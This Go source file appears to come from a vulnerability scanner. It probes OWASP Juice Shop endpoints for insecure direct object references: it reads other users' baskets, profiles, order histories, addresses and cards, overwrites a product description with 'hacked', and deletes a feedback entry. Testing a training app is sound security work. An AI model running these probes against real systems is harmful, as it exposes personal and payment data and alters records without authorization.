package probers

import (
	"context"
	"fmt"
	"strings"

	"github.com/borntobeyours/ouroboros/pkg/types"
)

// IDORProber tests for Insecure Direct Object Reference vulnerabilities.
type IDORProber struct{}

func (p *IDORProber) Name() string { return "idor" }

func (p *IDORProber) Probe(ctx context.Context, target types.Target, endpoints []types.Endpoint) []types.Finding {
	cfg := NewProberConfig(target)
	var findings []types.Finding

	findings = append(findings, p.testBasketIDOR(cfg)...)
	findings = append(findings, p.testUserIDOR(cfg)...)
	findings = append(findings, p.testProductIDOR(cfg)...)
	findings = append(findings, p.testFeedbackIDOR(cfg)...)
	findings = append(findings, p.testComplaintIDOR(cfg)...)
	findings = append(findings, p.testOrderHistoryIDOR(cfg)...)
	findings = append(findings, p.testAddressIDOR(cfg)...)
	findings = append(findings, p.testCardIDOR(cfg)...)

	return findings
}

func (p *IDORProber) testBasketIDOR(cfg *ProberConfig) []types.Finding {
	var findings []types.Finding

	for id := 1; id <= 5; id++ {
		url := fmt.Sprintf("%s/rest/basket/%d", cfg.BaseURL, id)
		status, _, respBody, err := cfg.DoRequest("GET", url, nil, nil)
		if err != nil {
			continue
		}

		if status == 200 && (strings.Contains(respBody, "Products") || strings.Contains(respBody, "data")) {
			findings = append(findings, MakeFinding(
				fmt.Sprintf("IDOR - Access Other Users' Basket (ID: %d)", id),
				"High",
				fmt.Sprintf("Basket ID %d can be accessed by any authenticated user, exposing other users' shopping cart contents.", id),
				fmt.Sprintf("/rest/basket/%d", id),
				"GET",
				"CWE-639",
				fmt.Sprintf(`curl %s -H "Authorization: %s"`, url, cfg.AuthToken),
				fmt.Sprintf("HTTP %d - Basket data returned: %s", status, truncate(respBody, 200)),
				"idor",
				0,
			))
			break // One finding is sufficient to prove the vulnerability
		}
	}

	return findings
}

func (p *IDORProber) testUserIDOR(cfg *ProberConfig) []types.Finding {
	var findings []types.Finding

	// Test accessing individual user records
	for id := 1; id <= 5; id++ {
		url := fmt.Sprintf("%s/api/Users/%d", cfg.BaseURL, id)
		status, _, respBody, err := cfg.DoRequest("GET", url, nil, nil)
		if err != nil {
			continue
		}

		if status == 200 && (strings.Contains(respBody, "email") || strings.Contains(respBody, "username")) {
			findings = append(findings, MakeFinding(
				fmt.Sprintf("IDOR - Access User Profile (ID: %d)", id),
				"High",
				fmt.Sprintf("User profile ID %d is accessible without proper authorization, exposing PII including email and username.", id),
				fmt.Sprintf("/api/Users/%d", id),
				"GET",
				"CWE-639",
				fmt.Sprintf(`curl %s`, url),
				fmt.Sprintf("HTTP %d - User data: %s", status, truncate(respBody, 200)),
				"idor",
				0,
			))
			break
		}
	}

	// Test listing all users
	url := cfg.BaseURL + "/api/Users"
	status, _, respBody, err := cfg.DoRequest("GET", url, nil, nil)
	if err == nil && status == 200 && strings.Contains(respBody, "email") {
		findings = append(findings, MakeFinding(
			"IDOR - List All Users Without Authorization",
			"Critical",
			"The Users API endpoint exposes all user records without requiring authentication, leaking emails, usernames, and password hashes.",
			"/api/Users",
			"GET",
			"CWE-639",
			fmt.Sprintf(`curl %s`, url),
			fmt.Sprintf("HTTP %d - All users listed: %s", status, truncate(respBody, 300)),
			"idor",
			0,
		))
	}

	return findings
}

func (p *IDORProber) testProductIDOR(cfg *ProberConfig) []types.Finding {
	var findings []types.Finding

	for id := 1; id <= 3; id++ {
		url := fmt.Sprintf("%s/api/Products/%d", cfg.BaseURL, id)
		status, _, respBody, err := cfg.DoRequest("GET", url, nil, nil)
		if err != nil {
			continue
		}

		if status == 200 && strings.Contains(respBody, "name") {
			// Try to modify the product (PUT)
			modBody := `{"description":"hacked"}`
			s2, _, rb2, e2 := cfg.DoRequest("PUT", url, strings.NewReader(modBody),
				map[string]string{"Content-Type": "application/json"})
			if e2 == nil && s2 == 200 {
				findings = append(findings, MakeFinding(
					"IDOR - Modify Product Data",
					"High",
					"Products can be modified by any user via direct API access without authorization checks.",
					fmt.Sprintf("/api/Products/%d", id),
					"PUT",
					"CWE-639",
					fmt.Sprintf(`curl -X PUT %s -H "Content-Type: application/json" -d '{"description":"test"}'`, url),
					fmt.Sprintf("HTTP %d - Product modified: %s", s2, truncate(rb2, 200)),
					"idor",
					0,
				))
			}
			break
		}
	}

	return findings
}

func (p *IDORProber) testFeedbackIDOR(cfg *ProberConfig) []types.Finding {
	var findings []types.Finding

	// List feedbacks
	url := cfg.BaseURL + "/api/Feedbacks"
	status, _, respBody, err := cfg.DoRequest("GET", url, nil, nil)
	if err == nil && status == 200 && strings.Contains(respBody, "data") {
		findings = append(findings, MakeFinding(
			"IDOR - Access All Feedback Entries",
			"Medium",
			"The Feedbacks API endpoint allows listing all feedback entries without authorization.",
			"/api/Feedbacks",
			"GET",
			"CWE-639",
			fmt.Sprintf(`curl %s`, url),
			fmt.Sprintf("HTTP %d - Feedback data: %s", status, truncate(respBody, 200)),
			"idor",
			0,
		))
	}

	// Try deleting a feedback
	delURL := cfg.BaseURL + "/api/Feedbacks/1"
	s2, _, rb2, e2 := cfg.DoRequest("DELETE", delURL, nil, nil)
	if e2 == nil && s2 == 200 {
		findings = append(findings, MakeFinding(
			"IDOR - Delete Other Users' Feedback",
			"High",
			"Feedback entries can be deleted by any user without authorization verification.",
			"/api/Feedbacks/1",
			"DELETE",
			"CWE-639",
			fmt.Sprintf(`curl -X DELETE %s`, delURL),
			fmt.Sprintf("HTTP %d - Feedback deleted: %s", s2, truncate(rb2, 200)),
			"idor",
			0,
		))
	}

	return findings
}

func (p *IDORProber) testComplaintIDOR(cfg *ProberConfig) []types.Finding {
	var findings []types.Finding

	url := cfg.BaseURL + "/api/Complaints"
	status, _, respBody, err := cfg.DoRequest("GET", url, nil, nil)
	if err == nil && status == 200 && strings.Contains(respBody, "data") {
		findings = append(findings, MakeFinding(
			"IDOR - Access All Complaints",
			"Medium",
			"The Complaints API allows listing all complaint records without proper authorization.",
			"/api/Complaints",
			"GET",
			"CWE-639",
			fmt.Sprintf(`curl %s`, url),
			fmt.Sprintf("HTTP %d - Complaint data: %s", status, truncate(respBody, 200)),
			"idor",
			0,
		))
	}

	return findings
}

func (p *IDORProber) testOrderHistoryIDOR(cfg *ProberConfig) []types.Finding {
	var findings []types.Finding

	if cfg.AuthToken == "" {
		return findings
	}

	// Try accessing other users' order history
	emails := []string{"admin@juice-sh.op", "jim@juice-sh.op", "bender@juice-sh.op"}
	for _, email := range emails {
		url := fmt.Sprintf("%s/rest/order-history/%s", cfg.BaseURL, email)
		status, _, respBody, err := cfg.DoRequest("GET", url, nil, nil)
		if err != nil {
			continue
		}

		if status == 200 && (strings.Contains(respBody, "data") || strings.Contains(respBody, "[")) {
			findings = append(findings, MakeFinding(
				fmt.Sprintf("IDOR - Access Order History (%s)", email),
				"High",
				fmt.Sprintf("Order history for %s is accessible by any authenticated user.", email),
				fmt.Sprintf("/rest/order-history/%s", email),
				"GET",
				"CWE-639",
				fmt.Sprintf(`curl %s -H "Authorization: %s"`, url, cfg.AuthToken),
				fmt.Sprintf("HTTP %d - Order data: %s", status, truncate(respBody, 200)),
				"idor",
				0,
			))
			break
		}
	}

	return findings
}

func (p *IDORProber) testAddressIDOR(cfg *ProberConfig) []types.Finding {
	var findings []types.Finding

	url := cfg.BaseURL + "/api/Addresss"
	status, _, respBody, err := cfg.DoRequest("GET", url, nil, nil)
	if err == nil && status == 200 && strings.Contains(respBody, "data") {
		findings = append(findings, MakeFinding(
			"IDOR - Access All Addresses",
			"Medium",
			"The Addresss API endpoint allows listing all address records.",
			"/api/Addresss",
			"GET",
			"CWE-639",
			fmt.Sprintf(`curl %s -H "Authorization: %s"`, url, cfg.AuthToken),
			fmt.Sprintf("HTTP %d - Address data: %s", status, truncate(respBody, 200)),
			"idor",
			0,
		))
	}

	return findings
}

func (p *IDORProber) testCardIDOR(cfg *ProberConfig) []types.Finding {
	var findings []types.Finding

	url := cfg.BaseURL + "/api/Cards"
	status, _, respBody, err := cfg.DoRequest("GET", url, nil, nil)
	if err == nil && status == 200 && strings.Contains(respBody, "data") {
		findings = append(findings, MakeFinding(
			"IDOR - Access Payment Cards",
			"High",
			"The Cards API endpoint allows accessing payment card data.",
			"/api/Cards",
			"GET",
			"CWE-639",
			fmt.Sprintf(`curl %s -H "Authorization: %s"`, url, cfg.AuthToken),
			fmt.Sprintf("HTTP %d - Card data: %s", status, truncate(respBody, 200)),
			"idor",
			0,
		))
	}

	return findings
}
